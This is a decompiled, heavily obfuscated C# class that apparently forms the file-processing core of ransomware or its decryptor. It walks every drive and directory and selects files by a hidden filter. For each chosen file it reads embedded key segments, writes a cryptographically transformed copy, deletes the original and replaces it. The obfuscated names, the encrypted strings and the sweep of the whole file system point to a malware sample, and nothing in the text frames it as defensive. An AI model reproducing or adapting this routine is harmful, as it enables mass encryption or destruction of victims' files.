#define TRACE
using System;
using System.Diagnostics;
using System.IO;
using _003Cdion2ntty2ic0uyoe_003E_007B43570453_002D3AD8_002D4A5B_002DB273_002D83DF8156D820_007D;

namespace C3904355907;

public sealed class C4110462503
{
	public void C3554254475()
	{
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Iv());
		DriveInfo[] drives = DriveInfo.GetDrives();
		C3463352047.C3554254475();
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.IW() + drives.Length + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Iw());
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo_ in array)
		{
			C3554254475(driveInfo_);
		}
	}

	private void C3554254475(DriveInfo driveInfo_0)
	{
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz());
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.IX() + driveInfo_0.Name + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.aR());
		Trace.Indent();
		if (driveInfo_0.IsReady)
		{
			DirectoryInfo[] directories = driveInfo_0.RootDirectory.GetDirectories();
			DirectoryInfo[] array = directories;
			foreach (DirectoryInfo directoryInfo_ in array)
			{
				C3554254475(directoryInfo_);
			}
		}
		else
		{
			Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Ix());
		}
		Trace.Unindent();
	}

	private void C3554254475(DirectoryInfo directoryInfo_0)
	{
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz());
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.IY() + directoryInfo_0.Name + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.aR());
		if (!C878818188.C3554254475(directoryInfo_0.FullName))
		{
			Trace.Indent();
			Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Iy());
			Trace.Unindent();
			return;
		}
		try
		{
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			if (directories != null)
			{
				DirectoryInfo[] array = directories;
				foreach (DirectoryInfo directoryInfo_ in array)
				{
					C3554254475(directoryInfo_);
				}
			}
			FileInfo[] files = directoryInfo_0.GetFiles();
			FileInfo[] array2 = files;
			foreach (FileInfo fileInfo_ in array2)
			{
				C3554254475(fileInfo_);
			}
		}
		catch (Exception ex)
		{
			Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz());
			Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.IZ());
			Trace.WriteLine(ex.ToString());
		}
	}

	private void C3554254475(FileInfo fileInfo_0)
	{
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz());
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Iz() + fileInfo_0.Name + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.aR());
		Trace.Indent();
		if (C878818188.C3554254475(fileInfo_0))
		{
			Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iA());
			byte[] byte_ = null;
			byte[] byte_2 = null;
			byte[] byte_3 = null;
			string text = fileInfo_0.FullName + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ia();
			C543223747.C3554254475(fileInfo_0, ref byte_3);
			int c3904355907 = C3110715001.C3904355907;
			byte[] byte_4 = new byte[C3463352047.C3554254475.Length];
			Array.Copy(byte_3, c3904355907, byte_4, 0, C3463352047.C3554254475.Length);
			int sourceIndex = c3904355907 + byte_4.Length;
			byte[] byte_5 = new byte[C3463352047.C3904355907.Length];
			Array.Copy(byte_3, sourceIndex, byte_5, 0, C3463352047.C3904355907.Length);
			C3463352047.C3554254475(ref byte_4, ref byte_, ref byte_5, ref byte_2);
			using (FileStream fileStream = File.Create(text))
			{
				fileStream.Position = 0L;
				C2181537457.C3554254475(fileStream, ref byte_3, C3110715001.C3904355907 + byte_4.Length + byte_5.Length, byte_, byte_2);
			}
			fileInfo_0.Delete();
			File.Copy(text, fileInfo_0.FullName);
			File.Delete(text);
		}
		else
		{
			Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iB());
		}
		Trace.Unindent();
	}
}
